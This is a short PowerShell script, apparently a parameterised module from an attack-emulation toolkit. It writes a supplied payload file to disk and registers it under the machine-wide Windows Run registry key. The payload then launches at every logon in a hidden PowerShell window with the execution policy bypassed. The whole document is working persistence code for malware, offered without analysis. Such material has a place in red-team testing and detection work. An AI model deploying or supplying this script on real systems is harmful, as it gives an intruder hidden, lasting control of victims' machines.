script:
if (-not $RUN_VALUE_NAME -or -not $PAYLOAD_PATH) { throw 'RUN_VALUE_NAME and PAYLOAD_PATH are required' }
$dir = Split-Path $PAYLOAD_PATH -Parent
New-Item -ItemType Directory -Force -Path $dir | Out-Null
if ($PAYLOAD_BODY) { Set-Content -Path $PAYLOAD_PATH -Value $PAYLOAD_BODY -Encoding ascii }
$extra = if ($ARGUMENTS) { " $ARGUMENTS" } else { '' }
$cmd = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PAYLOAD_PATH`"$extra"
$k = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('SOFTWARE\Microsoft\Windows\CurrentVersion\Run', $true)
$k.SetValue($RUN_VALUE_NAME, $cmd, 'String')
$k.Close()
